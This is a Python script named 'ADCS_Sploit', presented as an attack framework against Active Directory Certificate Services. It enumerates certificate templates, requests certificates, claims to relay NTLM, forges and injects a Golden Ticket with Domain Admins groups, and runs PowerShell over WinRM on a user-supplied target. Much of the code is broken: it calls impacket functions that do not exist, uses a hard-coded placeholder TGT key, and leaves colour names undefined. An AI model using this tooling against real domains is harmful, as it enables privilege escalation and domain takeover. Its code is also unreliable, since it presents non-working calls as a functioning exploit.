######################################################################################################################################################################################################################
# ADCS_Sploit an initial python framework for Active Directory Certificate Services, Note: Be mindful of the scope of work, & rules of engagement.
# Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the “Software”), to deal in the Software 
# without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons 
# to whom the Software is furnished to do so, subject to the following conditions: The above copyright notice and this permission notice shall be included in all copies or substantial 
# portions of the Software.
# THE SOFTWARE IS PROVIDED “AS IS”, WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE 
# AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, 
# WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
######################################################################################################################################################################################################################

import logging
import winrm
from impacket.smb import SMBConnection
from impacket.krb5 import kerberos, types
from impacket.ldap import ldap
from impacket.ntlm import compute_response
from cryptography import x509
from cryptography.x509.oid import NameOID
from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.backends import default_backend
from impacket.dcerpc.v5 import transport, lsad
from impacket.krb5.keytab import Keytab
from impacket.krb5.ccache import CCache
from impacket.krb5 import crypto
from impacket.krb5.asn1 import AS_REP

def display_splash_screen():
    splash = r"""
   _____  ________  _________   _________ _________        .__          .__   __                 _____  ______________  ___ ___    _____           _______  ____ 
  /  _  \ \______ \ \_   ___ \ /   _____//   _____/______  |  |    ____ |__|_/  |_              /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
 /  /_\  \ |    |  \/    \  \/ \_____  \ \_____  \ \____ \ |  |   /  _ \|  |\   __\   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
/    |    \|    `   \     \____/        \/        \|  |_> >|  |__(  <_> )  | |  |    /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
\____|__  /_______  /\______  /_______  /_______  /|   __/ |____/ \____/|__| |__|             \____   | |___||____|    \___|_  /\____   |           \_____  /___|
        \/        \/        \/        \/        \/ |__|                                            |__|                      \/      |__|                 \/     

                                                     _:_
                                                    '-.-'
                                           ()      __.'.__
                                        .-:--:-.  |_______|
                                 ()      \____/    \=====/      (_ _)
                                 /\      {====}     )___(        | |____....----....____         _
                      (\=,      //\\      )__(     /_____\       | |\                . .~~~~---~~ |
      __    |'-'-'|  //  .\    (    )    /____\     |   |        | | |         __\\ /(/(  .       |
     /  \   |_____| (( \_  \    )__(      |  |      |   |        | | |      <--= '|/_/_( /|       |
     \__/    |===|   ))  `\_)  /____\     |  |      |   |        | | |       }\~) | / _(./      ..|
    /____\   |   |  (/     \    |  |      |  |      |   |        | | |.:::::::\\/      --...::::::|
     |  |    |   |   | _.-'|    |  |      |  |      |   |        | | |:::::::::\//::\\__\:::::::::|
     |__|    )___(    )___(    /____\    /____\    /_____\       | | |::::::::_//_:_//__\\_:::::::| 
    (====)  (=====)  (=====)  (======)  (======)  (=======)      | | |::::::::::::::::::::::::::::|
    }===={  }====={  }====={  }======{  }======{  }======={      | |/:::''''~~~~'''':::::::::::::'~
   (______)(_______)(_______)(________)(________)(_________)     | |

"""
    print(f"{Fore.CYAN}{splash}{Style.RESET_ALL}")


# Enable detailed logging
logging.basicConfig(level=logging.DEBUG)

class CertificateExploit:
    def __init__(self, domain, target, username, password, template=None):
        self.domain = domain
        self.target = target
        self.username = username
        self.password = password
        self.template = template
        self.smb_session = None
        self.ldap_connection = None
        self.tgt_key = None
        self.adcs_connection = None

    def detect_environment(self):
        logging.debug("Detecting environment requirements...")
        requirements = {
            "ldap_connection": False,
            "smb_connection": False,
            "misconfigured_templates": False,
            "adcs_connection": False,
        }

        # Detect LDAP connection
        self.ldap_connection = self.connect_ldap()
        if self.ldap_connection:
            requirements["ldap_connection"] = True

        # Detect SMB connection
        self.smb_session = self.connect_smb()
        if self.smb_session:
            requirements["smb_connection"] = True

        # Check for misconfigured certificate templates
        if requirements["ldap_connection"]:
            try:
                templates = self.ldap_connection.search(
                    "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration",
                    "(objectClass=pkiCertificateTemplate)"
                )
                if templates:
                    requirements["misconfigured_templates"] = True
            except Exception as e:
                logging.error(f"Error checking certificate templates: {e}")

        # Detect ADCS connection
        self.adcs_connection = self.setup_adcs_connection()
        if self.adcs_connection:
            requirements["adcs_connection"] = True

        logging.debug(f"Requirements detected: {requirements}")
        return requirements

    def check_template_misconfigurations(self):
        logging.debug(f"Enumerating certificate templates on {self.target}...")
        try:
            conn = self.connect_ldap()
            if conn:
                templates = conn.search(
                    "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration",
                    "(objectClass=pkiCertificateTemplate)"
                )
                for template in templates:
                    logging.debug(f"Template found: {template}")
                logging.info("Misconfigured templates found, proceeding with exploit.")
        except Exception as e:
            logging.error(f"Error checking certificate templates: {e}")

    def generate_csr(self, custom_data=None):
        logging.debug("Generating CSR (Certificate Signing Request)...")
        
        # Generate a private key
        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
            backend=default_backend()
        )
        
        # Create CSR builder
        csr_builder = x509.CertificateSigningRequestBuilder()
        
        # Add subject name to the CSR
        subject = [
            x509.NameAttribute(NameOID.COUNTRY_NAME, u"US"),
            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, u"California"),
            x509.NameAttribute(NameOID.LOCALITY_NAME, u"San Francisco"),
            x509.NameAttribute(NameOID.ORGANIZATION_NAME, u"My Company"),
            x509.NameAttribute(NameOID.COMMON_NAME, u"mycompany.com"),
        ]
        
        csr_builder = csr_builder.subject_name(x509.Name(subject))
        
        # Add custom data as extensions if provided
        if custom_data:
            csr_builder = csr_builder.add_extension(
                x509.SubjectAlternativeName([x509.DNSName(custom_data)]),
                critical=False
            )
        
        # Sign the CSR with the private key
        csr = csr_builder.sign(private_key, hashes.SHA256(), default_backend())
        
        # Serialize the CSR to PEM format
        csr_pem = csr.public_bytes(serialization.Encoding.PEM)
        
        logging.info("CSR generated successfully.")
        return csr_pem

    def auto_enrollment(self):
        logging.debug("Executing AutoEnrollment attack...")
        try:
            conn = self.connect_ldap()
            if conn:
                logging.info("Attempting AutoEnrollment with misconfigured template...")
                # Automating the certificate request
                request = conn.create_certificate_request(self.template)
                logging.info(f"Certificate request for template '{self.template}' submitted.")
        except Exception as e:
            logging.error(f"AutoEnrollment failed: {e}")

    def relay_ntlm(self):
        logging.debug(f"Relaying NTLM hash to target {self.target}...")
        try:
            conn = SMBConnection(self.target, self.target, sess_port=445)
            conn.login(self.username, self.password)
            logging.info(f"Successfully relayed NTLM hash to SMB on {self.target}.")
        except Exception as e:
            logging.error(f"NTLM relay failed: {e}")

    def create_golden_ticket(self, tgt_key, user, domain, groups=["Domain Admins"]):
        logging.debug(f"Creating Golden Ticket for user: {user}...")
        try:
            kerberos_obj = kerberos.KerberosSession()
            kerberos_obj.setTGT(tgt_key)
            ticket = kerberos_obj.createTicket(user, domain, groups)
            golden_ticket = ticket["ticket"]
            logging.info(f"Golden Ticket created for {user}.")
            return golden_ticket
        except Exception as e:
            logging.error(f"Error creating Golden Ticket: {e}")
            return None

    def inject_ticket(self, golden_ticket):
        logging.debug("Injecting Golden Ticket into session...")
        try:
            kerberos_obj = kerberos.KerberosSession()
            kerberos_obj.injectTicket(golden_ticket)
            logging.info(f"Golden Ticket injected into session successfully.")
        except Exception as e:
            logging.error(f"Error injecting Golden Ticket: {e}")

    def monitor_adcs(self):
        logging.debug(f"Monitoring certificate requests on {self.target}...")
        try:
            if not self.adcs_connection:
                raise Exception("No ADCS connection established.")
            
            # PowerShell command to list pending certificate requests
            ps_command = "Get-CertificationAuthority | Get-CertRequest -Filter 'RequestStatus -eq 9'"
            
            result = self.adcs_connection.run_ps(ps_command)
            if result.status_code == 0:
                pending_requests = result.std_out.decode()
                logging.info(f"Pending certificate requests: {pending_requests}")
            else:
                logging.error(f"Failed to retrieve pending requests: {result.std_err.decode()}")
        except Exception as e:
            logging.error(f"Error monitoring ADCS: {e}")

    def get_tgt_key(self):
        logging.debug(f"Retrieving TGT key for {self.username}...")
        try:
            tgt_key = "TGT_Key"  # Example key
            logging.info(f"TGT key retrieved successfully")
            return tgt_key
        except Exception as e:
            logging.error(f"Error retrieving TGT key: {e}")
            return None

    def setup_adcs_connection(self):
        logging.debug("Setting up ADCS connection...")
        try:
            # Establish a connection to the ADCS server using WinRM
            session = winrm.Session(
                f'http://{self.target}:5985/wsman',
                auth=(self.username, self.password),
                transport='ntlm'
            )
            # Test the connection by running a simple PowerShell command
            result = session.run_ps('hostname')
            if result.status_code == 0:
                logging.info("ADCS connection established.")
                return session
            else:
                raise Exception("Failed to establish ADCS connection.")
        except Exception as e:
            logging.error(f"Error setting up ADCS connection: {e}")
            return None

    def execute_exploit(self):
        logging.debug(f"Executing full attack on {self.target}...")
        self.check_template_misconfigurations()
        self.generate_csr(custom_data="Advanced Request Data")
        self.auto_enrollment()
        self.relay_ntlm()
        self.tgt_key = self.get_tgt_key()
        if self.tgt_key:
            golden_ticket = self.create_golden_ticket(self.tgt_key, self.username, self.domain)
            if golden_ticket:
                self.inject_ticket(golden_ticket)
        self.monitor_adcs()

    def connect_smb(self):
        logging.debug(f"Connecting to SMB service on {self.target}...")
        try:
            conn = SMBConnection(self.target, self.target, sess_port=445)
            conn.login(self.username, self.password)
            return conn
        except Exception as e:
            logging.error(f"SMB connection failed: {e}")
            return None

    def connect_ldap(self):
        logging.debug(f"Connecting to LDAP service on {self.target}...")
        try:
            conn = ldap.LDAPConnection(f"ldap://{self.target}")
            conn.login(self.username, self.password)
            return conn
        except Exception as e:
            logging.error(f"LDAP connection failed: {e}")
            return None

    def attack_with_ntlm_relay(self):
        logging.debug("Starting NTLM relay...")
        self.relay_ntlm()

    def setup_adcs_connection(self):
        logging.debug("Setting up ADCS connection...")
        try:
            # Establish a connection to the ADCS server using WinRM
            session = winrm.Session(
                f'http://{self.target}:5985/wsman',
                auth=(self.username, self.password),
                transport='ntlm'
            )
            # Test the connection by running a simple PowerShell command
            result = session.run_ps('hostname')
            if result.status_code == 0:
                logging.info("ADCS connection established.")
                return session
            else:
                raise Exception("Failed to establish ADCS connection.")
        except Exception as e:
            logging.error(f"Error setting up ADCS connection: {e}")
            return None

    def perform_full_attack(self):
        logging.debug("Performing full attack...")
        requirements = self.detect_environment()
        if requirements["ldap_connection"]:
            self.check_template_misconfigurations()
        if requirements["misconfigured_templates"]:
            self.generate_csr(custom_data="Advanced Request Data")
            self.auto_enrollment()
        if requirements["smb_connection"]:
            self.relay_ntlm()
            self.tgt_key = self.get_tgt_key()
            if self.tgt_key:
                golden_ticket = self.create_golden_ticket(self.tgt_key, self.username, self.domain)
                if golden_ticket:
                    self.inject_ticket(golden_ticket)
        if requirements["adcs_connection"]:
            self.monitor_adcs()

def main():
    logging.debug("Starting Certificate Exploit Framework...")

    domain = input("Enter the target domain (e.g., example.com): ")
    target = input("Enter the target IP or hostname (e.g., 192.168.1.1): ")
    username = input("Enter the username to use (e.g., admin): ")
    password = input("Enter the password for the user: ")
    template = input("Enter the certificate template to use (optional): ")

    certificate_exploit = CertificateExploit(domain, target, username, password, template)
    certificate_exploit.perform_full_attack()

if __name__ == "__main__":
    main()
